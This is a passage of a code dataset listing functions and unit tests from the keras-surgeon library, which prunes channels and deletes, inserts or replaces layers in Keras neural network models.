    surgeon = Surgeon(model)
    surgeon.add_job('delete_channels', del_layer, channels=channel_index)
    new_model = surgeon.operate()
    new_w = new_model.layers[next_layer_index].get_weights()
    flat_sz = np.prod(layer.get_output_shape_at(0)[1:])
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    if data_format == 'channels_first':
        delete_indices = [x * flat_sz // channel_count + i for x in channel_index for i in range(0, flat_sz // channel_count)]
    elif data_format == 'channels_last':
        delete_indices = [x + i for i in range(0, flat_sz, channel_count) for x in channel_index]
    else:
        raise ValueError
    correct_w = model.layers[next_layer_index].get_weights()
    correct_w[0] = np.delete(correct_w[0], delete_indices, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,layer_test_helper_merge_2d,"def layer_test_helper_merge_2d(layer, channel_index, data_format):
    input_shape = list(random.randint(10, 20, size=3))
    input_1 = Input(shape=input_shape)
    input_2 = Input(shape=input_shape)
    x = Conv2D(3, [3, 3], data_format=data_format, name='conv_1')(input_1)
    y = Conv2D(3, [3, 3], data_format=data_format, name='conv_2')(input_2)
    x = layer([x, y])
    x = Flatten()(x)
    main_output = Dense(5, name='dense_1')(x)
    model = Model(inputs=[input_1, input_2], outputs=main_output)
    del_layer = model.get_layer('conv_1')
    del_layer_2 = model.get_layer('conv_2')
    surgeon = Surgeon(model)
    surgeon.add_job('delete_channels', del_layer, channels=channel_index)
    surgeon.add_job('delete_channels', del_layer_2, channels=channel_index)
    new_model = surgeon.operate()
    new_w = new_model.get_layer('dense_1').get_weights()
    flat_sz = np.prod(layer.get_output_shape_at(0)[1:])
    channel_count = getattr(del_layer, utils.get_channels_attr(del_layer))
    channel_index = [i % channel_count for i in channel_index]
    if data_format == 'channels_first':
        delete_indices = [x * flat_sz // channel_count + i for x in channel_index for i in range(0, flat_sz // channel_count)]
    elif data_format == 'channels_last':
        delete_indices = [x + i for i in range(0, flat_sz, channel_count) for x in channel_index]
    else:
        raise ValueError
    correct_w = model.get_layer('dense_1').get_weights()
    correct_w[0] = np.delete(correct_w[0], delete_indices, axis=0)
    assert weights_equal(correct_w, new_w)"
BenWhetton/keras-surgeon,weights_equal,"def weights_equal(w1, w2):
    if len(w1) != len(w2):
        return False
    else:
        return all([np.array_equal(w1[i], w2[i]) for i in range(len(w1))])"
BenWhetton/keras-surgeon,test_delete_layer,"def test_delete_layer():
    input_1 = Input(shape=[7, 7, 1])
    conv2d_1 = Conv2D(3, [3, 3], data_format='channels_last')
    conv2d_2 = Conv2D(3, [3, 3], data_format='channels_last')
    flatten_1 = Flatten()
    dense_1 = Dense(3)
    dense_2 = Dense(3)
    dense_3 = Dense(3)
    dense_4 = Dense(1)
    x = conv2d_1(input_1)
    x = conv2d_2(x)
    x = flatten_1(x)
    x = dense_1(x)
    x = dense_2(x)
    x = dense_3(x)
    output_1 = dense_4(x)
    model_1 = utils.clean_copy(Model(input_1, output_1))
    x = conv2d_1(input_1)
    x = conv2d_2(x)
    x = flatten_1(x)
    x = dense_1(x)
    x = dense_3(x)
    output_2 = dense_4(x)
    model_2_exp = utils.clean_copy(Model(input_1, output_2))
    model_2 = operations.delete_layer(model_1, model_1.get_layer(dense_2.name))
    assert compare_models(model_2, model_2_exp)"
BenWhetton/keras-surgeon,test_delete_layer_reuse,"def test_delete_layer_reuse():
    input_1 = Input(shape=[3])
    dense_1 = Dense(3)
    dense_2 = Dense(3)
    dense_3 = Dense(3)
    dense_4 = Dense(3)
    x = dense_1(input_1)
    x = dense_2(x)
    x = dense_3(x)
    x = dense_2(x)
    output_1 = dense_4(x)
    model_1 = Model(input_1, output_1)
    x = dense_1(input_1)
    x = dense_3(x)
    output_2 = dense_4(x)
    model_2_exp = Model(input_1, output_2)
    model_2 = operations.delete_layer(model_1, model_1.get_layer(dense_2.name), copy=False)
    assert compare_models(model_2, model_2_exp)"
BenWhetton/keras-surgeon,test_replace_layer,"def test_replace_layer():
    input_1 = Input(shape=[7, 7, 1])
    dense_1 = Dense(3)
    dense_2 = Dense(3)
    dense_3 = Dense(3)
    dense_4 = Dense(1)
    x = dense_1(input_1)
    x = dense_2(x)
    output_1 = dense_4(x)
    model_1 = utils.clean_copy(Model(input_1, output_1))
    x = dense_1(input_1)
    x = dense_3(x)
    output_2 = dense_4(x)
    model_2_exp = utils.clean_copy(Model(input_1, output_2))
    model_2 = operations.replace_layer(model_1, model_1.get_layer(dense_2.name), dense_3)
    assert compare_models(model_2, model_2_exp)"
BenWhetton/keras-surgeon,test_insert_layer,"def test_insert_layer():
    input_1 = Input(shape=[7, 7, 1])
    dense_1 = Dense(3)
    dense_2 = Dense(3)
    dense_3 = Dense(3)
    dense_4 = Dense(1)
    x = dense_1(input_1)
    x = dense_2(x)
    output_1 = dense_4(x)
    model_1 = utils.clean_copy(Model(input_1, output_1))
    x = dense_1(input_1)
    x = dense_2(x)
    x = dense_3(x)
    output_2 = dense_4(x)
    model_2_exp = utils.clean_copy(Model(input_1, output_2))
    model_2 = operations.insert_layer(model_1, model_1.get_layer(dense_4.name), dense_3)
    assert compare_models(model_2, model_2_exp)"
BenWhetton/keras-surgeon,test_delete_layer_same_layer_outputs,"def test_delete_layer_same_layer_outputs():
    input_1 = Input(shape=(10,))
    dense_1 = Dense(3)
    dense_2 = Dense(3)
    dense_3 = Dense(3)
    dense_4 = Dense(1)
    x = dense_1(input_1)
    y = dense_2(x)
    x = dense_3(x)
    output_1 = dense_4(x)
    output_2 = dense_4(y)
    model_1 = utils.clean_copy(Model(input_1, [output_1, output_2]))
    x = dense_1(input_1)
    y = dense_2(x)
    output_1 = dense_4(x)
    output_2 = dense_4(y)
    model_2_exp = utils.clean_copy(Model(input_1, [output_1, output_2]))
    model_2 = operations.delete_layer(model_1, model_1.get_layer(dense_3.name), copy=False)
    assert compare_models(model_2, model_2_exp)"
BenWhetton/keras-surgeon,test_delete_channels_downstream_sharing,"def test_delete_channels_downstream_sharing():
    input_1 = Input(shape=(5,))
    dense_1 = Dense(4, name='dense_1')
    dense_2 = Dense(4, name='dense_2')
    dense_3 = Dense(3, name='dense_3')
    x = dense_1(input_1)
    y = dense_2(input_1)
    output_1 = dense_3(x)
    output_2 = dense_3(y)
    model_1 = utils.clean_copy(Model(input_1, [output_1, output_2]))
    surgeon = Surgeon(model_1)
    surgeon.add_job('delete_channels', model_1.get_layer(dense_1.name), channels=[0])
    surgeon.add_job('delete_channels', model_1.get_layer(dense_2.name), channels=[1])
    model_2 = surgeon.operate()
    dense_1_exp = Dense(3, name='dense_1')
    dense_2_exp = Dense(3, name='dense_2')
    dense_3_exp = Dense(3, name='dense_3')
    x = dense_1_exp(input_1)
    y = dense_2_exp(input_1)
    output_1 = dense_3_exp(x)
    output_2 = dense_3_exp(y)
    model_2_exp = utils.clean_copy(Model(input_1, [output_1, output_2]))
    config_1 = model_2.get_config()
    config_2 = model_2_exp.get_config()
    config_2['name'] = config_1['name']
    assert json.dumps(config_1) == json.dumps(config_2)"
BenWhetton/keras-surgeon,test_delete_all_channels_in_branch,"def test_delete_all_channels_in_branch():
    input_1 = Input(shape=(20, 20, 3))
    conv_1 = Conv2D(2, [3, 3], name='conv_1')
    conv_2 = Conv2D(3, [3, 3], name='conv_2')
    cat_1 = Concatenate(name='cat_1')
    x = conv_1(input_1)
    y = conv_2(input_1)
    output_1 = cat_1([x, y])
    model_1 = utils.clean_copy(Model(input_1, output_1))
    surgeon = Surgeon(model_1, copy=True)
    surgeon.add_job('delete_channels', model_1.get_layer('conv_1'), channels=[0, 1])
    model_2 = surgeon.operate()
    output_1 = conv_2(input_1)
    model_2_exp = utils.clean_copy(Model(input_1, output_1))
    config_1 = model_2.get_config()
    config_2 = model_2_exp.get_config()
    config_2['name'] = config_1['name']
    assert json.dumps(config_1) == json.dumps(config_2)"
BenWhetton/keras-surgeon,test_delete_all_channels_in_long_branch,"def test_delete_all_channels_in_long_branch():
    input_1 = Input(shape=(20, 20, 3))
    conv_1 = Conv2D(2, [3, 3], name='conv_1')
    conv_2 = Conv2D(3, [3, 3], name='conv_2')
    conv_3 = Conv2D(4, [1, 1], name='conv_3')
    cat_1 = Concatenate(name='cat_1')
    x = conv_1(input_1)
    x = conv_3(x)
    y = conv_2(input_1)
    output_1 = cat_1([x, y])
    model_1 = utils.clean_copy(Model(input_1, output_1))
    surgeon = Surgeon(model_1, copy=True)
    surgeon.add_job('delete_channels', model_1.get_layer('conv_1'), channels=[0, 1])
    model_2 = surgeon.operate()
    output_1 = conv_2(input_1)
    model_2_exp = utils.clean_copy(Model(input_1, output_1))
    config_1 = model_2.get_config()
    config_2 = model_2_exp.get_config()
    config_2['name'] = config_1['name']
    assert config_1 == config_2"
BenWhetton/keras-surgeon,compare_models,"def compare_models(model_1, model_2):
    config_1 = model_1.get_config()
    config_2 = model_2.get_config()
    config_2['name'] = config_1['name']
    config_match = json.dumps(config_1) == json.dumps(config_2)
    weights_match = all([np.array_equal(weight_1, weight_2) for (weight_1, weight_2) in zip(model_1.get_weights(), model_2.get_weights())])
    return config_match and weights_match"
BenWhetton/keras-surgeon,test_get_shallower_nodes,"def test_get_shallower_nodes():
    input_1 = Input((10,))
    input_2 = Input((10,))
    dense_1 = Dense(3)
    dense_2 = Dense(4)
    dense_3 = Dense(5)
    x = dense_1(input_1)
    node_1_1 = dense_1.inbound_nodes[0]
    y = dense_1(input_2)
    node_2_1 = dense_1.inbound_nodes[1]
    assert node_1_1 != node_2_1
    output_1 = dense_2(x)
    node_1_2 = dense_2.inbound_nodes[0]
    output_2 = dense_3(y)
    node_2_2 = dense_3.inbound_nodes[0]
    assert get_shallower_nodes(node_1_1) == [node_1_2]
    assert get_shallower_nodes(node_2_1) == [node_2_2]
    output_3 = dense_2(y)
    node_2_2_2 = dense_2.inbound_nodes[1]
    assert get_shallower_nodes(node_2_1) == [node_2_2, node_2_2_2]"
BenWhetton/keras-surgeon,test_find_activation_layer,"def test_find_activation_layer():
    conv1_filters = 1
    conv2_filters = 1
    dense_units = 1
    model = Sequential()
    model.add(Conv2D(conv1_filters, [3, 3], input_shape=(28, 28, 1), data_format='channels_last', name='conv_1'))
    model.add(Activation('relu', name='act_1'))
    model.add(MaxPool2D((2, 2), name='pool_1'))
    model.add(Conv2D(conv2_filters, [3, 3], data_format='channels_last', name='conv_2'))
    model.add(Activation('relu', name='act_2'))
    model.add(MaxPool2D((2, 2), name='pool_2'))
    model.add(Flatten(name='flat_1'))
    model.add(Dense(dense_units, name='dense_1'))
    model.add(Activation('relu', name='act_3'))
    model.add(Dense(10, name='dense_2'))
    model.add(Activation('softmax', name='act_4'))
    assert find_activation_layer(model.get_layer('conv_1'), 0) == (model.get_layer('act_1'), 0)
    assert find_activation_layer(model.get_layer('conv_2'), 0) == (model.get_layer('act_2'), 0)
    assert find_activation_layer(model.get_layer('dense_1'), 0) == (model.get_layer('act_3'), 0)
    assert find_activation_layer(model.get_layer('dense_2'), 0) == (model.get_layer('act_4'), 0)"
BenWhetton/keras-surgeon,test_mean_calculator,"def test_mean_calculator():
    mean_calculator = MeanCalculator(sum_axis=0)
    x1 = np.array([[1, 2, 3], [4, 5, 6]])
    x2 = np.array([[7, 8, 9], [10, 11, 12]])
    expected_mean = np.array([5.5, 6.5, 7.5])
    mean_calculator.add(x1)
    mean_calculator.add(x2)
    result = mean_calculator.calculate()
    assert (result == expected_mean).all()"
BenWhetton/keras-surgeon,get_apoz,"def get_apoz(model, layer, x_val, node_indices=None):
    """"""Identify neurons with high Average Percentage of Zeros (APoZ).

    The APoZ a.k.a. (A)verage (P)ercentage (o)f activations equal to (Z)ero,
    is a metric for the usefulness of a channel defined in this paper:
    ""Network Trimming: A Data-Driven Neuron Pruning Approach towards Efficient
    Deep Architectures"" - [Hu et al. (2016)][]
    `high_apoz()` enables the pruning methodology described in this paper to be
    replicated.

    If node_indices are not specified and the layer is shared within the model
    the APoZ will be calculated over all instances of the shared layer.

    Args:
        model: A Keras model.
        layer: The layer whose channels will be evaluated for pruning.
        x_val: The input of the validation set. This will be used to calculate
            the activations of the layer of interest.
        node_indices(list[int]): (optional) A list of node indices.

    Returns:
        List of the APoZ values for each channel in the layer.
    """"""
    if isinstance(layer, str):
        layer = model.get_layer(name=layer)
    if layer not in model.layers:
        raise ValueError('layer is not a valid Layer in model.')
    layer_node_indices = utils.find_nodes_in_model(model, layer)
    if not node_indices:
        node_indices = layer_node_indices
    elif len(node_indices) != len(set(node_indices)):
        raise ValueError('`node_indices` contains duplicate values.')
    elif not set(node_indices).issubset(layer_node_indices):
        raise ValueError('One or more nodes specified by `layer` and `node_indices` are not in `model`.')
    data_format = getattr(layer, 'data_format', 'channels_last')
    mean_calculator = utils.MeanCalculator(sum_axis=0)
    for node_index in node_indices:
        (act_layer, act_index) = utils.find_activation_layer(layer, node_index)
        temp_model = Model(model.inputs, act_layer.get_output_at(act_index))
        a = temp_model.predict(x_val)
        if data_format == 'channels_first':
            a = np.swapaxes(a, 1, -1)
        activations = np.reshape(a, [-1, a.shape[-1]])
        zeros = (activations == 0).astype(int)
        mean_calculator.add(zeros)
    return mean_calculator.calculate()"
BenWhetton/keras-surgeon,high_apoz,"def high_apoz(apoz, method='std', cutoff_std=1, cutoff_absolute=0.99):
    """"""
    Args:
        apoz: List of the APoZ values for each channel in the layer.
        method: Cutoff method for high APoZ. ""std"", ""absolute"" or ""both"".
        cutoff_std: Channels with a higher APoZ than the layer mean plus
            `cutoff_std` standard deviations will be identified for pruning.
        cutoff_absolute: Channels with a higher APoZ than `cutoff_absolute`
            will be identified for pruning.

    Returns:
        high_apoz_channels: List of indices of channels with high APoZ.

    """"""
    if method not in {'std', 'absolute', 'both'}:
        raise ValueError('Invalid `mode` argument. Expected one of {""std"", ""absolute"", ""both""} but got', method)
    if method == 'std':
        cutoff = apoz.mean() + apoz.std() * cutoff_std
    elif method == 'absolute':
        cutoff = cutoff_absolute
    else:
        cutoff = min([cutoff_absolute, apoz.mean() + apoz.std() * cutoff_std])
    cutoff = min(cutoff, 1)
    return np.where(apoz >= cutoff)[0]"
BenWhetton/keras-surgeon,delete_layer,"def delete_layer(model, layer, *, node_indices=None, copy=True):
    """"""Delete instances of a layer from a Keras model.

    Args:
        model: A Model.
        layer: A Layer contained in model.
        node_indices: The indices of the inbound_node to the layer instances to
                      be deleted.
        copy: If True, the model will be copied before and after
              manipulation. This keeps both the old and new models' layers
              clean of each-others data-streams.

    Returns:
        Keras Model object with the layer at node_index deleted.
    """"""
    surgeon = Surgeon(model, copy)
    surgeon.add_job('delete_layer', layer, node_indices=node_indices)
    return surgeon.operate()"
BenWhetton/keras-surgeon,insert_layer,"def insert_layer(model, layer, new_layer, *, node_indices=None, copy=True):
    """"""Insert new_layer before instances of layer.

    If node_indices is not specified. The layer will be inserted before all
    instances of the layer in the model.

    Args:
        model: A Model.
        layer: A Layer contained in model.
        new_layer: A layer to be inserted into model before layer.
        node_indices: The indices of the inbound_node to layer where the
                      new layer is to be inserted.
        copy: If True, the model will be copied before and after
              manipulation. This keeps both the old and new models' layers
              clean of each-others data-streams.

    Returns:
        A new Model object with layer inserted.
    """"""
    surgeon = Surgeon(model, copy)
    surgeon.add_job('insert_layer', layer, node_indices=node_indices, new_layer=new_layer)
    return surgeon.operate()"
BenWhetton/keras-surgeon,replace_layer,"def replace_layer(model, layer, new_layer, *, node_indices=None, copy=True):
    """"""Replace instances of layer with new_layer.

        If node_indices is not specified, all instances of layer will be
        replaced by instances of new_layer

        Args:
            model: A Model.
            layer: A Layer contained in model.
            new_layer: A layer to be inserted into model before layer.
            node_indices: The indices of the inbound_node to layer where the
                          new layer is to be inserted.
            copy: If True, the model will be copied before and after
                  manipulation. This keeps both the old and new models' layers
                  clean of each-others data-streams.

        Returns:
            A new Model object with layer inserted.
        """"""
    surgeon = Surgeon(model, copy)
    surgeon.add_job('replace_layer', layer, node_indices=node_indices, new_layer=new_layer)
    return surgeon.operate()"
BenWhetton/keras-surgeon,delete_channels,"def delete_channels(model, layer, channels, *, node_indices=None, copy=None):
    """"""Delete channels from instances of the specified layer.

    This method is designed to facilitate research into pruning networks to
    improve their prediction performance and/or reduce computational load by
    deleting channels.
    All weights associated with the deleted channels in the specified layer
    and any affected downstream layers are deleted.
    If the layer is shared and node_indices is set, channels will be deleted
    from the corresponding layer instances only. This will break the weight
    sharing between affected and unaffected instances in subsequent training.
    In this case affected instances will be renamed.


    Args:
        model: Model object.
        layer: Layer whose channels are to be deleted.
        channels: Indices of the channels to be deleted
        node_indices: Indices of the nodes where channels are to be deleted.
        copy: If True, the model will be copied before and after
              manipulation. This keeps both the old and new models' layers
              clean of each-others data-streams.

    Returns:
        A new Model with the specified channels and associated weights deleted.

    Notes:
        Channels are filters in conv layers and units in other layers.
    """"""
    surgeon = Surgeon(model, copy)
    surgeon.add_job('delete_channels', layer, node_indices=node_indices, channels=channels)
    return surgeon.operate()"
BenWhetton/keras-surgeon,__init__,"def __init__(self, model, copy=None):
    if copy:
        self.model = utils.clean_copy(model)
    else:
        self.model = model
    self.nodes = []
    self._copy = copy
    self._finished_nodes = {}
    self._replace_tensors = TensorDict()
    self._channels_map = {}
    self._new_layers_map = {}
    self._insert_layers_map = {}
    self._replace_layers_map = {}
    self._mod_func_map = {}
    self._kwargs_map = {}
    self.valid_jobs = ('delete_layer', 'insert_layer', 'replace_layer', 'delete_channels')"
BenWhetton/keras-surgeon,add_job,"def add_job(self, job, layer, *, channels=None, new_layer=None, node_indices=None):
    """"""Adds a job for the Surgeon to perform on the model.

        Job options are:
        'delete_layer': delete `layer` from the model
                        required keyword arguments: None
        'insert_layer': insert `new_layer` before `layer`
                        required keyword arguments: `new_layer`
        'replace_layer': replace `layer` with `new_layer`
                         required keyword arguments: `new_layer`
        'delete_channels': delete `channels` from `layer`
                           required keyword arguments: `channels`

        Jobs can be added in any order. They will be performed in order of
        decreasing network depth.
        A maximum of one job can be performed per node.

        Args:
            job(string): job identifier. One of `Surgeon.valid_jobs`.
            layer(Layer): A layer from `model` to be modified.
            channels(list[int]): A list of channels used for the job.
                                 Used in `delete_channels`.
            new_layer(Layer): A new layer used for the job. Used in
                              `insert_layer` and `replace_layer`.
            node_indices(list[int]): (optional) A list of node indices used to
                                    selectively apply the job to a subset of
                                    the layer's nodes. Nodes are selected with:
                                    node[i] = layer.inbound_nodes[node_indices[i]]
        """"""
    if self._copy:
        layer = self.model.get_layer(layer.name)
    if layer not in self.model.layers:
        raise ValueError('layer is not a valid Layer in model.')
    layer_node_indices = utils.find_nodes_in_model(self.model, layer)
    if not node_indices:
        node_indices = layer_node_indices
    elif len(node_indices) != len(set(node_indices)):
        raise ValueError('`node_indices` contains duplicate values.')
    elif not set(node_indices).issubset(layer_node_indices):
        raise ValueError('One or more nodes specified by `layer` and `node_indices` are not in `model`.')
    kwargs = {}
    if job == 'delete_channels':
        if set(node_indices) != set(layer_node_indices):
            kwargs['layer_name'] = layer.name + '_' + job
        kwargs['channels'] = channels
        mod_func = self._delete_channels
    elif job == 'delete_layer':
        mod_func = self._delete_layer
    elif job == 'insert_layer':
        kwargs['new_layer'] = new_layer
        mod_func = self._insert_layer
    elif job == 'replace_layer':
        kwargs['new_layer'] = new_layer
        mod_func = self._replace_layer
    else:
        raise ValueError(job + ' is not a recognised job. Valid jobs are:\n-', '\n- '.join(self.valid_jobs))
    job_nodes = []
    for node_index in node_indices:
        job_nodes.append(layer.inbound_nodes[node_index])
    if set(job_nodes).intersection(self.nodes):
        raise ValueError('Cannot apply several jobs to the same node.')
    for node in job_nodes:
        self._mod_func_map[node] = mod_func
        self._kwargs_map[node] = kwargs
    self.nodes.extend(job_nodes)"
BenWhetton/keras-surgeon,operate,"def operate(self):
    """"""Perform all jobs assigned to the surgeon.
        """"""
    sorted_nodes = sorted(self.nodes, reverse=True, key=lambda x: utils.get_node_depth(self.model, x))
    for node in sorted_nodes:
        sub_output_nodes = node_utils.parent_nodes(node)
        (outputs, output_masks) = self._rebuild_graph(self.model.inputs, sub_output_nodes)
        kwargs = self._kwargs_map[node]
        self._mod_func_map[node](node, outputs, output_masks, **kwargs)
    output_nodes = []
    for output in self.model.outputs:
        (layer, node_index, tensor_index) = output._keras_history
        output_nodes.append(layer.inbound_nodes[node_index])
    (new_outputs, _) = self._rebuild_graph(self.model.inputs, output_nodes)
    new_model = Model(self.model.inputs, new_outputs)
    if self._copy:
        return utils.clean_copy(new_model)
    else:
        return new_model"
BenWhetton/keras-surgeon,_rebuild_graph,"def _rebuild_graph(self, graph_inputs, output_nodes, graph_input_masks=None):
    """"""Rebuild the graph from graph_inputs to output_nodes.

        This does not return a model object, it re-creates the connections
        between layers and returns the output tensors and masks of the submodel
        This is a building block for the higher level surgery methods.
        See `Surgeon.operate` for details of how this method is used.

        Arguments:
            graph_inputs: List of the submodel's input tensor(s).
            output_nodes(list[Node]): List of the submodel's output node(s)
            graph_input_masks: Boolean mask for each submodel input.

        Returns:
            (tuple) containing :
                List of the output tensors of the rebuilt submodel
                List of the output masks of the rebuilt submodel
            tuple[submodel output tensors, output masks]

        """"""
    if not graph_input_masks:
        graph_input_masks = [None] * len(graph_inputs)

    def _rebuild_rec(node):
        """"""Rebuild the graph up to `node` recursively.

            Args:
                node(Node): Node to rebuild up to.
            Returns:
                (tuple) containing :
                The output tensor of the rebuilt `node`
                The output mask of the rebuilt `node`

            """"""
        layer = node.outbound_layer
        logging.debug('getting inputs for: {0}'.format(layer.name))
        node_output = utils.single_element(node.output_tensors)
        if node_output in self._replace_tensors.keys():
            logging.debug('bottomed out at replaced output: {0}'.format(node_output))
            (output, output_mask) = self._replace_tensors[node_output]
            return (output, output_mask)
        elif node in self._finished_nodes.keys():
            logging.debug('reached finished node: {0}'.format(node))
            return self._finished_nodes[node]
        mask_map = TensorDict()
        for (input, mask) in zip(graph_inputs, graph_input_masks):
            mask_map[input] = mask
        try:
            output_mask = mask_map[node_output]
            logging.debug('bottomed out at a model input')
            return (node_output, output_mask)
        except KeyError:
            inbound_nodes = node_utils.parent_nodes(node)
            logging.debug('inbound_layers: {0}'.format([node.outbound_layer.name for node in inbound_nodes]))
            (inputs, input_masks) = zip(*[_rebuild_rec(n) for n in inbound_nodes])
            if all((i is None for i in inputs)):
                output = None
                try:
                    assert len(node.output_tensors) <= 1
                except AssertionError as e:
                    raise e
                except:
                    pass
                output_mask = np.zeros(node.output_tensors.shape[1:], dtype=bool)
            elif any((i is None for i in inputs)):
                if node.outbound_layer.__class__.__name__ != 'Concatenate':
                    TypeError('Inputs can only be missing for concatenate layers.')
                inputs = [i for i in inputs if i is not None]
                (new_layer, output_mask) = self._apply_delete_mask(node, input_masks)
                if len(inputs) == 1:
                    output = utils.single_element(list(inputs))
                else:
                    output = new_layer(utils.single_element(list(inputs)))
            else:
                (new_layer, output_mask) = self._apply_delete_mask(node, input_masks)
                output = new_layer(utils.single_element(list(inputs)))
            self._finished_nodes[node] = (output, output_mask)
            logging.debug('layer complete: {0}'.format(layer.name))
            return (output, output_mask)
    (outputs, output_masks) = zip(*[_rebuild_rec(n) for n in output_nodes])
    return (utils.single_element(outputs), output_masks)"
BenWhetton/keras-surgeon,_delete_layer,"def _delete_layer(self, node, inputs, input_masks):
    """"""Skip adding node.outbound_layer when building the graph.""""""
    if not isinstance(inputs, tf.Tensor) and len(inputs) >= 2:
        raise ValueError('Cannot insert new layer at node with multiple inbound layers.')
    inputs = utils.single_element(inputs)
    input_masks = utils.single_element(input_masks)
    deleted_layer_output = utils.single_element(node.output_tensors)
    self._replace_tensors[deleted_layer_output] = (inputs, input_masks)"
BenWhetton/keras-surgeon,_insert_layer,"def _insert_layer(self, node, inputs, input_masks, new_layer=None):
    """"""Insert new_layer into the graph before node.outbound_layer.""""""
    if not isinstance(inputs, tf.Tensor) and len(inputs) >= 2:
        raise ValueError('Cannot insert new layer at node with multiple inbound layers.')
    new_output = new_layer(utils.single_element(inputs))
    old_output = utils.get_one_tensor(node.input_tensors)
    input_masks = utils.single_element(input_masks)
    self._replace_tensors[old_output] = (new_output, input_masks)"
BenWhetton/keras-surgeon,_replace_layer,"def _replace_layer(self, node, inputs, input_masks, new_layer=None):
    """"""Replace node.outbound_layer with new_layer. Add it to the graph.""""""
    new_output = new_layer(utils.single_element(inputs))
    replaced_layer_output = utils.single_element(node.output_tensors)
    input_masks = utils.single_element(input_masks)
    self._replace_tensors[replaced_layer_output] = (new_output, input_masks)"
BenWhetton/keras-surgeon,_delete_channels,"def _delete_channels(self, node, inputs, input_masks, channels=None, layer_name=None):
    """"""Delete selected channels of node.outbound_layer. Add it to the graph.
        """"""
    old_layer = node.outbound_layer
    old_layer_output = utils.single_element(node.output_tensors)
    new_delete_mask = self._make_delete_mask(old_layer, channels)
    if len(set(channels)) == getattr(old_layer, utils.get_channels_attr(old_layer)):
        self._replace_tensors[old_layer_output] = (None, new_delete_mask)
        return None
    if old_layer in self._new_layers_map.keys():
        new_layer = self._new_layers_map[old_layer]
    else:
        (temp_layer, new_mask) = self._apply_delete_mask(node, input_masks)
        temp_layer(utils.single_element(inputs))
        new_layer = self._delete_channel_weights(temp_layer, channels)
        if layer_name:
            new_layer.name = layer_name
        self._new_layers_map[old_layer] = new_layer
    new_output = new_layer(utils.single_element(inputs))
    self._replace_tensors[old_layer_output] = (new_output, new_delete_mask)"
BenWhetton/keras-surgeon,_apply_delete_mask,"def _apply_delete_mask(self, node, inbound_masks):
    """"""Apply the inbound delete mask and return the outbound delete mask

        When specific channels in a layer or layer instance are deleted, the
        mask propagates information about which channels are affected to
        downstream layers.
        If the layer contains weights, those which were previously connected
        to the deleted channels are deleted and outbound masks are set to None
        since further downstream layers aren't affected.
        If the layer does not contain weights, its output mask is calculated to
        reflect any transformations performed by the layer to ensure that
        information about the deleted channels is propagated downstream.


        Arguments:
            node(Node): The node where the delete mask is applied.
            inbound_masks: Mask(s) from inbound node(s).

        Returns:
            new_layer: Pass through `layer` if it has no weights, otherwise a
                       new `Layer` object with weights corresponding to the
                       inbound mask deleted.
            outbound_mask: Mask corresponding to `new_layer`.
        """"""
    layer = node.outbound_layer
    if all((mask is None for mask in inbound_masks)):
        new_layer = layer
        outbound_mask = None
        return (new_layer, outbound_mask)
    if any((mask is None for mask in inbound_masks)):
        inbound_masks = [np.ones(shape[1:], dtype=bool) if inbound_masks[i] is None else inbound_masks[i] for (i, shape) in enumerate(node.input_shapes)]
    if len(layer.inbound_nodes) > 1 and layer in self._replace_layers_map.keys():
        return self._replace_layers_map[layer]
    output_shape = utils.single_element(node.output_shapes)
    input_shape = utils.single_element(node.input_shapes)
    data_format = getattr(layer, 'data_format', 'channels_last')
    inbound_masks = utils.single_element(inbound_masks)
    layer_class = layer.__class__.__name__
    if layer_class == 'InputLayer':
        raise RuntimeError('This should never get here!')
    elif layer_class == 'Dense':
        if np.all(inbound_masks):
            new_layer = layer
        else:
            weights = layer.get_weights()
            weights[0] = weights[0][np.where(inbound_masks)[0], :]
            config = layer.get_config()
            config['weights'] = weights
            new_layer = type(layer).from_config(config)
        outbound_mask = None
    elif layer_class == 'Flatten':
        outbound_mask = np.reshape(inbound_masks, [-1])
        new_layer = layer
    elif layer_class in ('Conv1D', 'Conv2D', 'Conv3D'):
        if np.all(inbound_masks):
            new_layer = layer
        else:
            if data_format == 'channels_first':
                inbound_masks = np.swapaxes(inbound_masks, 0, -1)
            k_size = layer.kernel_size
            index = [slice(None, 1, None) for _ in k_size]
            inbound_masks = inbound_masks[tuple(index + [slice(None)])]
            weights = layer.get_weights()
            delete_mask = np.tile(inbound_masks[..., np.newaxis], list(k_size) + [1, weights[0].shape[-1]])
            new_shape = list(weights[0].shape)
            new_shape[-2] = -1
            weights[0] = np.reshape(weights[0][delete_mask], new_shape)
            config = layer.get_config()
            config['weights'] = weights
            new_layer = type(layer).from_config(config)
        outbound_mask = None
    elif layer_class in ('Cropping1D', 'Cropping2D', 'Cropping3D', 'MaxPooling1D', 'MaxPooling2D', 'MaxPooling3D', 'AveragePooling1D', 'AveragePooling2D', 'AveragePooling3D'):
        index = [slice(None, x, None) for x in output_shape[1:]]
        if data_format == 'channels_first':
            index[0] = slice(None)
        elif data_format == 'channels_last':
            index[-1] = slice(None)
        else:
            raise ValueError('Invalid data format')
        outbound_mask = inbound_masks[tuple(index)]
        new_layer = layer
    elif layer_class in ('UpSampling1D', 'UpSampling2D', 'UpSampling3D', 'ZeroPadding1D', 'ZeroPadding2D', 'ZeroPadding3D'):
        index = [slice(1)] * (len(input_shape) - 1)
        tile_shape = list(output_shape[1:])
        if data_format == 'channels_first':
            index[0] = slice(None)
            tile_shape[0] = 1
        elif data_format == 'channels_last':
            index[-1] = slice(None)
            tile_shape[-1] = 1
        else:
            raise ValueError('Invalid data format')
        channels_vector = inbound_masks[tuple(index)]
        outbound_mask = np.tile(channels_vector, tile_shape)
        new_layer = layer
    elif layer_class in ('GlobalMaxPooling1D', 'GlobalMaxPooling2D', 'GlobalAveragePooling1D', 'GlobalAveragePooling2D'):
        index = [0] * (len(input_shape) - 1)
        if data_format == 'channels_first':
            index[0] = slice(None)
        elif data_format == 'channels_last':
            index[-1] = slice(None)
        else:
            raise ValueError('Invalid data format')
        channels_vector = inbound_masks[tuple(index)]
        outbound_mask = channels_vector
        new_layer = layer
    elif layer_class in ('Dropout', 'Activation', 'SpatialDropout1D', 'SpatialDropout2D', 'SpatialDropout3D', 'ActivityRegularization', 'Masking', 'LeakyReLU', 'ELU', 'ThresholdedReLU', 'GaussianNoise', 'GaussianDropout', 'AlphaDropout', 'ReLU'):
        outbound_mask = inbound_masks
        new_layer = layer
    elif layer_class == 'Reshape':
        outbound_mask = np.reshape(inbound_masks, layer.target_shape)
        new_layer = layer
    elif layer_class == 'Permute':
